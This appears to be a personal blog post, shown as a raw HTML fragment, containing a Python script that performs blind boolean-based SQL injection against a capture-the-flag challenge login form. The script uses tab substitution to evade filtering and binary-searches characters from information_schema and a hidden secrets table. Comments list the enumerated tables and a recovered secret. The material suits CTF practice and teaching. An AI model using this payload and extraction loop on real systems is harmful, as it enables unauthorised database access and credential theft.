i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sqli/" itemprop="url" rel="index"><span itemprop="name">sqli</span></a></span></span></div></div></header><div class="post-body" itemprop="articleBody"><p>1<br><span id="more"></span></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">tab=unquote(<span class="string">&#x27;%09&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://80-6e92aa02-4dc4-4925-bb48-be3d19ad8d79.challenge.ctfplus.cn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):</span><br><span class="line">    idx=<span class="built_in">str</span>(idx)</span><br><span class="line">    <span class="comment">#or%090%09order%09by%093 order by 3报错 2列</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; select=f&quot;select group_concat(schema_name) from information_schema.schemata&quot; &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#数据库结果：information_schema,testdb,mysql,sys,performance_schema,test</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; select=f&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;testdb&#x27;&quot; &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#表：double_check,user</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;select=&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;&quot;#secret&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#double_check (secret</span></span><br><span class="line">    <span class="comment">#user username,password,Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Relo</span></span><br><span class="line">    select=<span class="string">&quot;select secret from double_check&quot;</span><span class="comment">#dtfrtkcc0czkoua9S</span></span><br><span class="line"></span><br><span class="line">    payload=<span class="string">f&quot;&#x27; or <span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>&gt;ASCII(SUBSTR((<span class="subst">&#123;select&#125;</span>) from <span class="subst">&#123;idx&#125;</span> for 1))#&quot;</span></span><br><span class="line"></span><br><span class="line">    payload=payload.replace(<span class="string">&#x27; &#x27;</span>,tab)</span><br><span class="line">    data=&#123;<span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">         <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;111&quot;</span>&#125;</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    res=requests.post(url=url,data=data) <span class="comment">#注入 c &gt; str切片(idx,1) #结果为真执行ret 1</span></span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    t=fnmatch.fnmatch(res.text,<span class="string">&#x27;*帐号或密码错误*&#x27;</span>)</span><br><span class="line">    t=<span class="keyword">not</span> t</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span>(t) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">l,r,cmp,idx</span>): </span><br><span class="line">    p=r//<span class="number">2</span> - l</span><br><span class="line">    <span class="keyword">while</span>(r-l&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(cmp(<span class="built_in">chr</span>(p) , idx)):<span class="comment">#大于</span></span><br><span class="line">            r=p</span><br><span class="line">            p=p-(p-l)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=p</span><br><span class="line">            p=p+(r-p)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(l)</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">    a+=find(<span class="number">0</span>,<span class="number">127</span>,cmptst,i)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-tags"><a href="/tags/web/" rel="tag"># web</a> <a href="/tags/sqli/" rel="tag"># sqli</a> <a href="/tags/python/" rel="tag"># python</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2024/12/07/cs/web/upload-labs/upload-labs/" rel="prev" title="upload-labs-1到14"><i class="fa fa-angle-left"></i> upload-labs-1到14</a></div><div class="post-nav-item"><a href="/2025/05/03/cs/web/php/php%E6%97%A0%E5%8F%82RCE/" rel="next" title="php无参RCE">php无参RCE <i class="fa fa-angle-right"></i></a></div></div></footer></article></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2025</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">jbbccl</span></div><div class="powered-by">由 <a href="https://he
